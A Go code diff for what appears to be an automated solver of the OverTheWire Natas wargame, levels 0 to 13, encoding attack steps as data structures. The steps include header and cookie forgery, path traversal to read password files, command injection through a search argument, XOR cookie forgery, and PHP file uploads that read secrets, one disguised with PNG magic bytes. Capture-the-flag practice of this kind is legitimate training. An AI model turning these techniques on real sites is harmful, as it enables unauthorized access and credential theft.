@@ -268,19 +268,108 @@ func (c Combine) Grab(r http.Request) string {
 }
 
 var levels = [...]Grabber{
+	//level 0
 	Prefixed{grab, "The password for natas1 is ", 32},
+	//level 1
 	Prefixed{grab, "The password for natas2 is ", 32},
-	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}},  // image @ /files/pixel.png, go to folder, find users.txt
+	//level 2
+	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}}, // image @ /files/pixel.png, go to folder, find users.txt
+	//level 3
 	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
+	//level 4
 	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
+	//level 5
 	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
+	//level 6
 	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
+	//level 7
 	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
-	Post{Prefixed{grab, "The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}, nil},
+	//level 8
+	Post{
+		Prefixed{grab, "The password for natas9 is ", 32},
+		SetData{
+			"submit": Text{"Submit Query"},
+			"secret": Base64Decode{
+				Reverse{
+					Hex2Dec{
+						Path{
+							Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32},
+							Text{"/index-source.html"},
+						},
+					},
+				},
+			},
+		},
+		nil,
+	},
+	//level 9
 	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
+	//level 10
 	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
-	Headers{Prefixed{grab, "The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
-	Path{grab, Combine{Text{"/"}, Post{XPath{grab, "//a/@href"}, SetData{"filename": Combine{XPath{grab, "//form/input[@name='filename']/@value"}, Text{".php"}}}, &File{XPath{grab, "//form/input[@type='file']/@name"}, Text{"exploit.php"}, memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>")}}}},
+	//level 11
+	Headers{
+		Prefixed{grab, "The password for natas12 is ", 32},
+		SetData{
+			"Cookie": Combine{
+				Text{"data="},
+				Base64Encode{
+					XOR{
+						Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
+						FindRepeating{
+							XOR{
+								Base64Decode{
+									Cookie{"data"},
+								},
+								Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
+							},
+						},
+					},
+				},
+			},
+		},
+	},
+	//level 12
+	Path{
+		Prefixed{grab, "", 32},
+		Combine{
+			Text{"/"},
+			Post{
+				XPath{grab, "//a/@href"},
+				SetData{
+					"filename": Combine{
+						XPath{grab, "//form/input[@name='filename']/@value"},
+						Text{".php"},
+					},
+				},
+				&File{
+					XPath{grab, "//form/input[@type='file']/@name"},
+					Text{"exploit.php"},
+					memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>"),
+				},
+			},
+		},
+	},
+	//level 13
+	Path{
+		Prefixed{grab, "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a", 32},
+		Combine{
+			Text{"/"},
+			Post{
+				XPath{grab, "//a/@href"},
+				SetData{
+					"filename": Combine{
+						XPath{grab, "//form/input[@name='filename']/@value"},
+						Text{".php"},
+					},
+				},
+				&File{
+					XPath{grab, "//form/input[@type='file']/@name"},
+					Text{"exploit.php"},
+					memio.Buffer("\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php include(\"/etc/natas_webpass/natas14\"); ?>"),
+				},
+			},
+		},
+	},
 }
 
 func e(err error) {
